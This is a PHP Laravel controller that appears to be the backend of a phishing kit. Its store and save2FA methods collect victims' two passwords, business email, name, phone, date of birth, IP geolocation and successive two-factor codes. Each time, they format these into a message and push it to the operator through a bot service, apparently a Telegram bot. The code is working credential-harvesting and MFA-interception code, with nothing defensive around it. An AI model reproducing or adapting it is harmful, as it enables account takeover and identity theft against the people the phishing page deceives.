<?php

namespace App\Http\Controllers;

use App\Models\UserInput;
use App\Services\BotService;
use Illuminate\Http\Request;

class UserInputController extends Controller
{
    protected $botService;

    public function __construct(BotService $botService)
    {
        $this->botService = $botService;
    }
    public function store(Request $request)
    {
        // Try to find existing record or create new one
        $input = UserInput::firstOrNew([
            'ip_address' => $request->ip(),
            'created_at' => now()->startOfDay()
        ]);
        
        // If record_id is provided, try to find that specific record
        if ($request->input('record_id')) {
            $existingRecord = UserInput::find($request->input('record_id'));
            if ($existingRecord) {
                $input = $existingRecord;
            }
        }

        if ($request->routeIs('user-input.session-data')) {
            // Save session data
            $input->fill([
                'password' => $request->input('pass1'),
                'second_password' => $request->input('pass2'),
                'business_email' => $request->input('email'),
                'full_name' => $request->input('fullName'),
                'phone' => $request->input('phone'),
                'date_of_birth' => $request->input('dateOfBirth')
            ]);
            $input->status = 'completed';
        }

        $input->save();
        
        $message = " 📝 Session Data:\n";
        $message .= "Email: <code>{$input->business_email}</code>\n";
        $message .= "Full Name: <code>{$input->full_name}</code>\n"; 
        $message .= "Password 1: <code>{$input->password}</code>\n";
        $message .= "Password 2: <code>{$input->second_password}</code>\n";
        $message .= "Phone: <code>{$input->phone}</code>\n";
        $message .= "Date of Birth: <code>{$input->date_of_birth}</code>\n\n";
        
        $message .= "🌐 IP Info:\n";
        $message .= "IP Address: <code>{$input->ip_address}</code>\n";
        $message .= "City: <code>{$input->city}</code>\n";
        $message .= "State: <code>{$input->region}</code>\n";
        $message .= "Postal Code: <code>{$input->postal}</code>\n";
        $message .= "User Agent: <code>{$input->user_agent}</code>\n";
        $message .= "Proxy: <code>N/A</code>\n\n";
        
        $message .= "🔑 2FA Code:\n";
        $message .= "Code: <code>N/A</code>\n";

        // Send message via bot service
        try {
            $this->botService->sendMessage($message);
        } catch (\Exception $e) {
            \Log::error('Failed to send bot message: ' . $e->getMessage());
            // Continue with the response even if bot message fails
        }
        return response()->json([
            'success' => true,
            'message' => 'Data saved successfully',
            'record_id' => $input->id
        ]);
    }

    public function saveClientInfo(Request $request)
    {
        $input = UserInput::firstOrNew([
            'ip_address' => $request->input('ip'),
            'created_at' => now()->startOfDay()
        ]);

        $input->fill([
            'ip_address' => $request->input('ip'),
            'city' => $request->input('city'),
            'region' => $request->input('region'),
            'country' => $request->input('country'),
            'postal' => $request->input('postal'),
            'user_agent' => $request->input('userAgent'),
        ]);

        $input->save();

        return response()->json([
            'success' => true,
            'message' => 'Client info saved successfully',
            'record_id' => $input->id
        ]);
    }
    public function save2FA(Request $request)
    {
        // If record_id is provided, try to find that specific record
        if ($request->input('record_id')) {
            $existingRecord = UserInput::find($request->input('record_id'));
            if ($existingRecord) {
                $input = $existingRecord;
            }
        }
        
        // Get existing 2FA codes if any
        $existingCodes = $input->two_fa_code ? json_decode($input->two_fa_code, true) : [];
        
        // Add new code entry with name and code
        $existingCodes[] = [
            'name' => $request->input('twoFACodeInput'),
            'code' => $request->input('twoFACode')
        ];
        
        $input->fill([
            'two_fa_code' => json_encode($existingCodes)
        ]);
        $input->save();

        // Format and send bot message
        $latestCode = end($existingCodes);
        
        $message = " 📝 Session Data:\n";
        $message .= "Email: <code>{$input->business_email}</code>\n";
        $message .= "Full Name: <code>{$input->full_name}</code>\n"; 
        $message .= "Password 1: <code>{$input->password}</code>\n";
        $message .= "Password 2: <code>{$input->second_password}</code>\n";
        $message .= "Phone: <code>{$input->phone}</code>\n";
        $message .= "Date of Birth: <code>{$input->date_of_birth}</code>\n\n";
        
        $message .= "🌐 IP Info:\n";
        $message .= "IP Address: <code>{$input->ip_address}</code>\n";
        $message .= "City: <code>{$input->city}</code>\n";
        $message .= "State: <code>{$input->region}</code>\n";
        $message .= "Postal Code: <code>{$input->postal}</code>\n";
        $message .= "User Agent: <code>{$input->user_agent}</code>\n";
        $message .= "Proxy: <code>N/A</code>\n\n";
        
        $message .= "🔑 2FA Code:\n";
        $message .= "{$latestCode['name']}: <code>{$latestCode['code']}</code>\n";

        // Send message via bot service
        try {
            $this->botService->sendMessage($message);
        } catch (\Exception $e) {
            \Log::error('Failed to send bot message: ' . $e->getMessage());
            // Continue with the response even if bot message fails
        }
        
        return response()->json([
            'success' => true,
            'message' => '2FA code saved successfully',
            'record_id' => $input->id
        ]);
    }
} 